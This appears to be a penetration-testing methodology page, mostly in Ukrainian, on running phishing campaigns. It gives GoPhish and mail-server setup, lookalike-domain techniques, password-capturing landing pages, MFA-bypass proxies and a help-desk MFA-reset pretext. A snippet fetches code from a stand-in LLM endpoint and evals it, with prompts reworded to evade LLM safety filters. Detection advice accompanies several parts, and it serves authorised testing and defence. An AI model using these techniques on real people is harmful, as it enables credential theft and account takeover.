# Phishing Методологія

{{#include ../../banners/hacktricks-training.md}}

## Методологія

1. Recon жертви
1. Виберіть **домен жертви**.
2. Виконайте базову веб-перевірку, **шукаючи портали входу**, які використовує жертва, і **вирішіть**, який з них ви будете **імітувати**.
3. Використайте **OSINT** для **знаходження електронних адрес**.
2. Підготуйте середовище
1. **Купіть домен**, який ви будете використовувати для phishing-оцінки
2. **Налаштуйте записи**, пов'язані з email-сервісом (SPF, DMARC, DKIM, rDNS)
3. Налаштуйте VPS з **gophish**
3. Підготуйте кампанію
1. Підготуйте **шаблон електронного листа**
2. Підготуйте **веб-сторінку** для викрадення облікових даних
4. Запустіть кампанію!

## Генерація схожих доменних імен або купівля довіреного домену

### Техніки варіацій доменних імен

- **Keyword**: Доменне ім'я **містить** важливе **keyword** оригінального домену (e.g., zelster.com-management.com).
- **hypened subdomain**: Замініть **крапку на дефіс** у субдомені (e.g., www-zelster.com).
- **New TLD**: Той самий домен з використанням **new TLD** (e.g., zelster.org)
- **Homoglyph**: Воно **замінює** літеру в доменному імені на **літери, що виглядають схожими** (e.g., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Воно **міняє місцями дві літери** в доменному імені (e.g., zelsetr.com).
- **Singularization/Pluralization**: Додає або видаляє “s” в кінці доменного імені (e.g., zeltsers.com).
- **Omission**: Воно **видаляє одну** з літер з доменного імені (e.g., zelser.com).
- **Repetition:** Воно **повторює одну** з літер в доменному імені (e.g., zeltsser.com).
- **Replacement**: Як homoglyph, але менш приховано. Воно замінює одну з літер в доменному імені, можливо на літеру поруч на клавіатурі (e.g, zektser.com).
- **Subdomained**: Вводить **крапку** всередині доменного імені (e.g., ze.lster.com).
- **Insertion**: Воно **вставляє літеру** у доменне ім'я (e.g., zerltser.com).
- **Missing dot**: Прикріплює TLD до доменного імені. (e.g., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Існує **можливість, що один із бітів, що зберігаються або передаються, може автоматично змінитися** через різні фактори, такі як сонячні спалахи, космічні промені або помилки обладнання.

Коли ця концепція **застосовується до DNS-запитів**, можливо, що **домен, який отримує DNS-сервер**, відрізняється від домену, який був початково запрошений.

Наприклад, одинична зміна біту в домені "windows.com" може перетворити його на "windnws.com."

Зловмисники можуть **використовувати це, реєструючи кілька bit-flipping доменів**, схожих на домен жертви. Їхня мета — перенаправити легітимних користувачів на власну інфраструктуру.

Для детальнішої інформації прочитайте [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Купівля довіреного домену

Ви можете шукати на [https://www.expireddomains.net/](https://www.expireddomains.net) прострочений домен, який можна використати.\
Щоб переконатися, що домен, який ви збираєтеся купити, **вже має хороший SEO**, ви можете перевірити, як його категоризовано в:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Виявлення електронних адрес

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% безкоштовно)
- [https://phonebook.cz/](https://phonebook.cz) (100% безкоштовно)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Щоб **знайти більше** дійсних електронних адрес або **перевірити ті**, що ви вже знайшли, ви можете перевірити, чи можете перебрати їх через SMTP-сервери жертви. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Крім того, не забувайте, що якщо користувачі використовують **будь-який веб-портал для доступу до пошти**, ви можете перевірити, чи він вразливий до **username brute force**, і за можливості експлуатувати цю вразливість.

## Налаштування GoPhish

### Встановлення

Ви можете завантажити його з [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Розпакуйте його в `/opt/gophish` і виконайте `/opt/gophish/gophish`\
Вам буде виведено пароль для admin-користувача на порту 3333 у виводі. Тому отримайте доступ до цього порту і використайте ці облікові дані, щоб змінити пароль адміністратора. Можливо, вам доведеться тунелювати цей порт до локального:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Конфігурація

**Налаштування TLS-сертифіката**

Перед цим кроком ви вже повинні були **купити домен**, який збираєтеся використовувати, і він має **вказувати** на **IP of the VPS**, на якому ви налаштовуєте **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Налаштування пошти**

Почніть встановлення: `apt-get install postfix`

Потім додайте домен у такі файли:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Також змініть значення наступних змінних у /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Нарешті змініть файли **`/etc/hostname`** та **`/etc/mailname`** на ваш домен і **перезапустіть VPS.**

Тепер створіть **DNS A record** для `mail.<domain>`, що вказує на **ip address** вашого VPS, та **DNS MX** запис, який вказує на `mail.<domain>`

Тепер давайте перевіримо відправку листа:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Налаштування Gophish**

Зупиніть виконання gophish і давайте його налаштуємо.\
Змініть `/opt/gophish/config.json` на наступне (зауважте використання https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Налаштування сервісу gophish**

Щоб створити сервіс gophish так, щоб його можна було запускати автоматично та керувати ним як сервісом, ви можете створити файл `/etc/init.d/gophish` з наступним вмістом:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Завершіть налаштування служби й перевірте її, виконавши:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Налаштування поштового сервера та домену

### Почекайте й будьте легітимними

Чим старший домен, тим менш ймовірно, що його вважатимуть спамом. Тому слід чекати якомога довше (принаймні 1 тиждень) перед проведенням phishing-оцінки. Більше того, якщо ви розмістите сторінку про репутаційну сферу, отримана репутація буде кращою.

Зауважте, що навіть якщо потрібно чекати тиждень, ви можете зараз завершити всю конфігурацію.

### Configure Reverse DNS (rDNS) record

Встановіть rDNS (PTR) запис, який резолвить IP-адресу VPS на доменне ім'я.

### Sender Policy Framework (SPF) Record

Ви повинні **налаштувати SPF-запис для нового домену**. Якщо ви не знаєте, що таке SPF-запис, [**прочитайте цю сторінку**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

You can use [https://www.spfwizard.net/](https://www.spfwizard.net) to generate your SPF policy (use the IP of the VPS machine)

![](<../../images/image (1037).png>)

Нижче — вміст, який потрібно встановити в TXT-записі домену:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Аутентифікація, звітування та відповідність на основі домену (DMARC) — запис

Ви повинні **налаштувати DMARC record для нового домену**. Якщо ви не знаєте, що таке DMARC record [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Вам потрібно створити новий DNS TXT запис з іменем хоста `_dmarc.<domain>` та наступним вмістом:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Ви повинні **налаштувати DKIM для нового домену**. Якщо ви не знаєте, що таке запис DMARC, [**прочитайте цю сторінку**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

This tutorial is based on: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Потрібно об'єднати обидва значення B64, які генерує ключ DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Test your email configuration score

Ви можете зробити це за допомогою [https://www.mail-tester.com/](https://www.mail-tester.com)\
Просто відкрийте сторінку та відправте лист на адресу, яку вони вам нададуть:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Ви також можете **перевірити конфігурацію вашої електронної пошти** надіславши листа на `check-auth@verifier.port25.com` та **переглянути відповідь** (для цього вам потрібно **відкрити** порт **25** і подивитися відповідь у файлі _/var/mail/root_ якщо ви відправляєте лист як root).\
Переконайтеся, що ви проходите всі тести:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Ви також можете надіслати **повідомлення на Gmail під вашим контролем** і перевірити **заголовки електронної пошти** у вашій папці "Вхідні" у Gmail, у полі заголовка `Authentication-Results` має бути присутній `dkim=pass`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Видалення з чорного списку Spamhouse

The page [www.mail-tester.com](https://www.mail-tester.com) може вказати, чи ваш домен блокується spamhouse. Ви можете подати запит на видалення домену/IP за адресою: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Видалення з чорного списку Microsoft

​​Ви можете подати запит на видалення домену/IP за адресою [https://sender.office.com/](https://sender.office.com).

## Створення і запуск кампанії GoPhish

### Профіль відправника

- Вкажіть деяку **назву для ідентифікації** профілю відправника
- Вирішіть, з якого облікового запису ви будете надсилати phishing emails. Пропозиції: _noreply, support, servicedesk, salesforce..._
- Ви можете залишити пустими username та password, але переконайтеся, що встановлено прапорець Ignore Certificate Errors

![](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Рекомендується використовувати функцію "Send Test Email" для перевірки, чи все працює.\
> Рекомендую надсилати тестові листи на адреси 10min mails, щоб уникнути потрапляння в чорний список під час тестів.

### Email Template

- Вкажіть деяку **назву для ідентифікації** шаблону
- Потім напишіть **subject** (нічого дивного, просто те, що можна очікувати в звичайному листі)
- Переконайтеся, що встановлено/позначено "**Add Tracking Image**"
- Напишіть **email template** (ви можете використовувати змінні, як у наступному прикладі):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Note that **in order to increase the credibility of the email**, it's recommended to use some signature from an email from the client. Suggestions:

- Надішліть листа на **неіснуючу адресу** і перевірте, чи є у відповіді якийсь підпис.
- Пошукайте **публічні email-и** як info@ex.com або press@ex.com або public@ex.com, надішліть їм листа і дочекайтесь відповіді.
- Спробуйте зв’язатися з **якоюсь валідною виявленою** електронною адресою і дочекайтесь відповіді

![](<../../images/image (80).png>)

> [!TIP]
> The Email Template also allows to **attach files to send**. If you would also like to steal NTLM challenges using some specially crafted files/documents [read this page](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Вкажіть **ім'я**
- **Напишіть HTML-код** веб-сторінки. Зверніть увагу, що ви можете **імпортувати** веб-сторінки.
- Позначте **Capture Submitted Data** та **Capture Passwords**
- Встановіть **перенаправлення**

![](<../../images/image (826).png>)

> [!TIP]
> Зазвичай треба змінювати HTML-код сторінки і виконувати тести локально (можливо використовуючи будь-який Apache server) **доки результат вас не задовольнить.** Потім вставте цей HTML-код у поле.\
> Зауважте, якщо вам потрібно **використовувати статичні ресурси** для HTML (наприклад CSS або JS), ви можете зберегти їх у _**/opt/gophish/static/endpoint**_ і потім звертатися до них з _**/static/\<filename>**_

> [!TIP]
> Для перенаправлення ви можете **редиректити користувачів на легітимну головну сторінку** жертви, або редиректити їх на _/static/migration.html_, наприклад, показати **spinning wheel (**[**https://loading.io/**](https://loading.io)**) протягом 5 секунд, а потім вказати, що процес пройшов успішно**.

### Users & Groups

- Вкажіть назву
- **Імпортуйте дані** (зауважте: щоб використати шаблон для прикладу, вам потрібні firstname, last name та email address кожного користувача)

![](<../../images/image (163).png>)

### Campaign

Нарешті, створіть campaign, обравши назву, email template, landing page, URL, sending profile та group. Зверніть увагу, що URL буде посиланням, яке надсилається жертвам.

Зауважте, що **Sending Profile дозволяє надіслати тестовий email, щоб побачити, як виглядатиме кінцевий фішинговий лист**:

![](<../../images/image (192).png>)

> [!TIP]
> Я рекомендую **надсилати тестові листи на 10min mails addresses**, щоб уникнути занесення в чорні списки під час тестів.

Коли все готово — просто запустіть campaign!

## Website Cloning

Якщо з якоїсь причини ви хочете клонувати веб-сайт, перегляньте наступну сторінку:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

У деяких phishing-оцінках (в основному для Red Teams) ви також захочете **надсилати файли, що містять якийсь backdoor** (можливо C2 або просто щось, що спровокує автентифікацію).\
Перегляньте наступну сторінку для прикладів:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Попередня атака досить хитра, оскільки ви підробляєте реальний вебсайт і збираєте інформацію, введену користувачем. На жаль, якщо користувач не ввів правильний пароль або якщо додаток, який ви підробили, налаштований з 2FA, **ця інформація не дозволить вам видати себе за обманутого користувача**.

Тут корисні інструменти на кшталт [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) та [**muraena**](https://github.com/muraenateam/muraena). Ці інструменти дозволяють реалізувати MitM-атаку. По суті, атака працює так:

1. Ви **імітуєте форму login** реальної вебсторінки.
2. Користувач **надсилає** свої **credentials** на вашу фейкову сторінку, і інструмент пересилає їх на реальний сайт, **перевіряючи, чи працюють credentials**.
3. Якщо акаунт налаштований з **2FA**, MitM-сторінка попросить його, і як тільки **користувач введе** код, інструмент відправить його на реальний сайт.
4. Як тільки користувач автентифікований, ви (як attacker) отримаєте **captured credentials, the 2FA, the cookie та будь-яку інформацію** про кожну взаємодію, поки інструмент виконує MitM.

### Via VNC

Що, якщо замість того, щоб **направляти жертву на шкідливу сторінку**, що має той самий вигляд, ви направите її в **VNC-сесію з браузером, підключеним до реального сайту**? Ви зможете бачити, що вона робить, вкрасти пароль, MFA, cookies...\
Цього можна досягти за допомогою [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Очевидно, один із найпростіших способів дізнатися, чи вас виявили — це **перевірити ваш домен у чорних списках**. Якщо він там присутній, якось ваш домен визнано підозрілим.\
Простий спосіб перевірити, чи з’являється ваш домен у чорних списках — використати [https://malwareworld.com/](https://malwareworld.com)

Проте є й інші способи дізнатися, чи **жертва активно шукає підозрілі фішингові активності в мережі**, як пояснено у:


{{#ref}}
detecting-phising.md
{{#endref}}

Ви можете **купити домен з дуже схожою назвою** на домен жертви **та/або згенерувати сертифікат** для **subdomain** домену, яким ви контролюєте, **що містить ключове слово** домену жертви. Якщо **жертва** виконає будь-яку **DNS або HTTP взаємодію** з ними, ви дізнаєтесь, що **вона активно шукає** підозрілі домени, і вам потрібно буде діяти дуже приховано.

### Evaluate the phishing

Використовуйте [**Phishious** ](https://github.com/Rices/Phishious) щоб оцінити, чи ваш email потрапить у папку spam, чи буде заблокований або пройде успішно.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Сучасні intrusion набори все частіше взагалі пропускають email-іміти та **безпосередньо таргетують процес service-desk / identity-recovery**, щоб обійти MFA. Атака повністю “living-off-the-land”: коли оператор має валідні credentials, він перемикається на вбудовані admin інструменти — malware не потрібен.

### Attack flow
1. Recon жертви
* Збирайте персональні та корпоративні дані з LinkedIn, data breaches, public GitHub тощо.
* Визначте високоваріантні ідентичності (executives, IT, finance) і виявіть **точний help-desk процес** для скидання пароля / MFA.
2. Real-time social engineering
* Дзвінки, Teams або чат із help-desk, прикидаючись ціллю (часто з **підробленим caller-ID** або **клоном голосу**).
* Надайте заздалегідь зібрані PII, щоб пройти перевірку на основі знань.
* Переконайте агентa **скинути MFA secret** або виконати **SIM-swap** на зареєстрований номер.
3. Immediate post-access actions (≤60 min в реальних випадках)
* Закріпіться через будь-який web SSO портал.
* Перелічіть AD / AzureAD вбудованими інструментами (без запуску бинарів):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Рух латерально з використанням **WMI**, **PsExec**, або легітимних **RMM** агентів, вже доданих у білий список в оточенні.

### Detection & Mitigation
* Розглядайте help-desk identity recovery як **привілейовану операцію** – вимагайте step-up auth та затвердження менеджера.
* Розгорніть **Identity Threat Detection & Response (ITDR)** / **UEBA** правила, що сповіщають про:
  * Зміну методу MFA + автентифікацію з нового пристрою / гео.
  * Миттєве підвищення привілеїв тієї самої сутності (user → admin).
* Записуйте дзвінки help-desk та вимагайте **call-back на вже зареєстрований номер** перед будь-яким скиданням.
* Реалізуйте **Just-In-Time (JIT) / Privileged Access**, щоб новоcкинуті облікові записи **не** автоматично отримували високопривілейовані токени.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Комерційні групи компенсують витрати дорогих операцій масовими атаками, які перетворюють **пошукові системи та рекламні мережі на канал доставки**.

1. **SEO poisoning / malvertising** просуває фейковий результат, наприклад `chromium-update[.]site`, у верхні рекламні позиції пошуку.
2. Жертва завантажує невеликий **first-stage loader** (часто JS/HTA/ISO). Приклади, які бачили Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader викачує куки браузера + credential DBs, потім завантажує **silent loader**, який у режимі реального часу вирішує, чи розгортати:
* RAT (наприклад AsyncRAT, RustDesk)
* ransomware / wiper
* компонент персистенції (registry Run key + scheduled task)

### Hardening tips
* Блокуйте щойно зареєстровані домени та впровадьте **Advanced DNS / URL Filtering** для *search-ads* так само, як і для електронної пошти.
* Обмежте встановлення софту до підписаних MSI / Store пакетів, забороніть виконання `HTA`, `ISO`, `VBS` політикою.
* Моніторте дочірні процеси браузерів, що відкривають інсталятори:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Полюйте на LOLBins, які часто зловживають first-stage loaders (наприклад `regsvr32`, `curl`, `mshta`).

---

## AI-Enhanced Phishing Operations
Атакувальники тепер ланцюжать **LLM & voice-clone APIs** для повністю персоналізованих приманок і взаємодії в режимі реального часу.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generate & send >100 k emails / SMS with randomised wording & tracking links.|
|Generative AI|Produce *one-off* emails referencing public M&A, inside jokes from social media; deep-fake CEO voice in callback scam.|
|Agentic AI|Autonomously register domains, scrape open-source intel, craft next-stage mails when a victim clicks but doesn’t submit creds.|

**Defence:**
• Додавайте **dynamic banners**, що підкреслюють повідомлення, надіслані від неперевіреної автоматизації (через ARC/DKIM anomalies).  
• Впровадьте **voice-biometric challenge phrases** для запитів високого ризику по телефону.  
• Постійно симулюйте AI-згенеровані приманки в програмах підвищення обізнаності — статичні шаблони застаріли.

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Атакувальники можуть надсилати безпідозрілий HTML і **генерувати stealer під час виконання**, запитуючи **доверений LLM API** для JavaScript, а потім виконуючи його в браузері (наприклад через `eval` або динамічний `<script>`).

1. **Prompt-as-obfuscation:** кодуйте exfil URLs/Base64 рядки в промпті; ітеруйте формулювання, щоб оминати фільтри безпеки і зменшувати галюцинації.
2. **Client-side API call:** при завантаженні JS звертається до публічного LLM (Gemini/DeepSeek/etc.) або CDN-проксі; у статичному HTML присутній лише prompt/API виклик.
3. **Assemble & exec:** конкатенуйте відповідь і виконайте її (поліморфно для кожного відвідування):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** згенерований код персоналізує приманку (наприклад, LogoKit token parsing) і надсилає creds на prompt-hidden endpoint.

**Ознаки ухилення**
- Трафік звертається до відомих доменів LLM або надійних CDN proxies; іноді — через WebSockets до бекенду.
- Немає статичного payload; зловмисний JS існує лише після рендерингу.
- Недетерміновані генерації створюють **унікальні** stealers для кожної сесії.

**Ідеї для виявлення**
- Запускайте sandboxes з увімкненим JS; позначайте **runtime `eval`/dynamic script creation, що походить із відповідей LLM**.
- Шукайте front-end POSTs до LLM APIs, які одразу супроводжуються `eval`/`Function` над повернутим текстом.
- Сигналізуйте про несанкціоновані домени LLM у клієнтському трафіку та наступні credential POSTs.

---

## MFA Fatigue / Push Bombing — Варіант: Примусове скидання
Окрім класичного push-bombing, оператори просто **змушують до нової реєстрації MFA** під час дзвінка до help-desk, анулюючи наявний token користувача. Будь-який наступний запит на вхід здається жертві легітимним.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitor for AzureAD/AWS/Okta events where **`deleteMFA` + `addMFA`** occur **within minutes from the same IP**.

## Clipboard Hijacking / Pastejacking

Зловмисники можуть непомітно скопіювати шкідливі команди в clipboard жертви з compromised або typosquatted веб‑сторінки, а потім обдурити користувача, щоб він вставив їх у **Win + R**, **Win + X** або terminal window, внаслідок чого виконується довільний код без будь‑яких download чи attachment.

{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Mobile‑gated phishing to evade crawlers/sandboxes
Оператори все частіше ставлять свої phishing flows за простою перевіркою пристрою, щоб desktop crawlers ніколи не доходили до фінальних сторінок. Типовий патерн — невеликий скрипт, що перевіряє touch-capable DOM і надсилає результат на server endpoint; non‑mobile clients отримують HTTP 500 (або порожню сторінку), тоді як mobile users отримують повний flow.

Мінімальний клієнтський фрагмент (типова логіка):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` логіка (спрощено):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Поведінка сервера, яка часто спостерігається:
- Встановлює session cookie під час першого завантаження.
- Приймає `POST /detect {"is_mobile":true|false}`.
- Повертає 500 (або заглушку) у відповідь на наступні GET-запити коли `is_mobile=false`; відображає фішинг лише якщо `true`.

Пошук і евристики для виявлення:
- Запит urlscan: `filename:"detect_device.js" AND page.status:500`
- Веб-телеметрія: послідовність `GET /static/detect_device.js` → `POST /detect` → HTTP 500 для не‑мобільних; легітимні шляхи мобільної жертви повертають 200 з подальшим HTML/JS.
- Блокуйте або ретельно перевіряйте сторінки, що умовно показують контент виключно на основі `ontouchstart` або подібних перевірок пристрою.

Поради щодо захисту:
- Запускайте crawlers з mobile-like fingerprints та увімкненим JS, щоб виявити gated content.
- Налаштуйте сповіщення про підозрілі відповіді 500 після `POST /detect` на нещодавно зареєстрованих доменах.

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)

{{#include ../../banners/hacktricks-training.md}}
